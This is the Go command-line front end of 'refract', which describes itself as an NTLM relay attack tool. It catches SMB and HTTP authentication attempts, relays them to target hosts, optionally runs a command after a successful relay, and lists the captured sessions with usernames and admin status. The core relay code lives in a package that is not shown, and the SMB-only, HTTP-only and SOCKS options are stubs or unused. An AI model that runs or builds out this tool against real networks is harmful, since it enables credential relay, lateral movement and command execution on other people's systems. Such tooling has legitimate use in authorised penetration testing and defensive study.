// refract — NTLM relay attack tool.
// Listens on SMB (445) and HTTP (80) for incoming authentication attempts,
// relays them to configured targets, and optionally opens a SOCKS5 proxy
// to multiplex the captured sessions.
package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/go-impacket/kit/internal/relay"
)

func main() {
	targetStr := flag.String("t", "", "single target (smb://host or host)")
	targetFile := flag.String("tf", "", "file with one target per line")
	watchFile := flag.Bool("w", false, "watch target file for changes")
	smbPort := flag.Int("smb-port", 445, "SMB listener port")
	httpPort := flag.Int("http-port", 80, "HTTP listener port")
	noSMB := flag.Bool("no-smb", false, "disable SMB listener")
	noHTTP := flag.Bool("no-http", false, "disable HTTP listener")
	execCmd := flag.String("c", "", "command to execute after successful relay")
	socksMode := flag.Bool("socks", false, "enable SOCKS5 session management")
	socksAddr := flag.String("socks-addr", "127.0.0.1", "SOCKS5 bind address")
	socksPort := flag.Int("socks-port", 1080, "SOCKS5 port")
	noMulti := flag.Bool("no-multi", false, "relay each target only once")
	randomize := flag.Bool("ra", false, "randomize target selection")
	ipv6 := flag.Bool("6", false, "listen on IPv6")
	relayTimeout := flag.Duration("timeout", 30*time.Second, "relay session timeout")
	flag.Parse()

	_ = socksAddr
	_ = socksPort
	_ = relayTimeout

	banner()

	var pool *relay.TargetPool
	var err error

	switch {
	case *targetStr != "":
		pool, err = relay.NewPool([]string{*targetStr}, *randomize)
	case *targetFile != "":
		pool, err = relay.PoolFromFile(*targetFile, *randomize)
	default:
		fmt.Fprintln(os.Stderr, "[-] specify -t <target> or -tf <file>")
		flag.Usage()
		os.Exit(1)
	}
	if err != nil {
		fatal("load targets: %v", err)
	}

	if *watchFile && *targetFile != "" {
		go relay.WatchFile(*targetFile, pool, *randomize)
	}

	vault := relay.NewVault()

	cfg := &relay.Config{
		Pool:        pool,
		Vault:       vault,
		SMBPort:     *smbPort,
		HTTPPort:    *httpPort,
		IPv6:        *ipv6,
		NoMulti:     *noMulti,
		PostCommand: *execCmd,
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	broker := relay.NewBroker(cfg)

	errCh := make(chan error, 1)

	if !*noSMB && !*noHTTP {
		go func() { errCh <- broker.Run(ctx) }()
	} else {
		if !*noSMB {
			go func() {
				smbOnlyCfg := *cfg
				smbOnlyCfg.HTTPPort = 0
				_ = smbOnlyCfg
				errCh <- runSMBOnly(ctx, cfg)
			}()
		}
		if !*noHTTP {
			go func() {
				errCh <- runHTTPOnly(ctx, cfg)
			}()
		}
	}

	log.Printf("[refract] waiting for connections (targets: %d)", len(pool.All()))

	if *socksMode {
		go runShell(vault, pool, cancel)
	}

	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	select {
	case sig := <-sigs:
		log.Printf("[refract] caught %v, shutting down", sig)
		cancel()
	case err := <-errCh:
		if err != nil {
			fatal("listener: %v", err)
		}
	}

	log.Printf("[refract] sessions captured: %d", len(vault.List()))
	for _, s := range vault.List() {
		log.Printf("  [%s] %s  %s\\%s", s.ID[:8], s.Target, s.Domain, s.Username)
	}
}

func runSMBOnly(ctx context.Context, cfg *relay.Config) error {
	addr := fmt.Sprintf("0.0.0.0:%d", cfg.SMBPort)
	if cfg.IPv6 {
		addr = fmt.Sprintf("[::]:%d", cfg.SMBPort)
	}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	defer ln.Close()
	log.Printf("[refract] SMB-only on %s", addr)
	go func() { <-ctx.Done(); ln.Close() }()
	for {
		c, err := ln.Accept()
		if err != nil {
			return err
		}
		go func() {
			defer c.Close()
			log.Printf("[refract] SMB connection from %s", c.RemoteAddr())
		}()
	}
}

func runHTTPOnly(ctx context.Context, cfg *relay.Config) error {
	broker := relay.NewBroker(cfg)
	_ = broker
	<-ctx.Done()
	return nil
}

func runShell(vault *relay.Vault, pool *relay.TargetPool, cancel context.CancelFunc) {
	sc := bufio.NewScanner(os.Stdin)
	fmt.Print("refract> ")
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		switch line {
		case "exit", "quit":
			cancel()
			return
		case "sessions":
			sessions := vault.List()
			if len(sessions) == 0 {
				fmt.Println("  (none)")
			}
			for _, s := range sessions {
				admin := ""
				if s.AdminStatus {
					admin = " [ADMIN]"
				}
				fmt.Printf("  %-16s %-20s %s\\%s%s\n",
					s.ID[:8], s.Target, s.Domain, s.Username, admin)
			}
		case "targets":
			for _, t := range pool.All() {
				fmt.Println(" ", t)
			}
		case "help":
			fmt.Println("  sessions  — list active relay sessions")
			fmt.Println("  targets   — list configured targets")
			fmt.Println("  exit      — shut down")
		case "":
		default:
			fmt.Printf("  unknown: %q (try 'help')\n", line)
		}
		fmt.Print("refract> ")
	}
}

func banner() {
	fmt.Println("refract — NTLM relay  |  github.com/go-impacket/kit")
	fmt.Println()
}

func fatal(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "[-] "+format+"\n", args...)
	os.Exit(1)
}
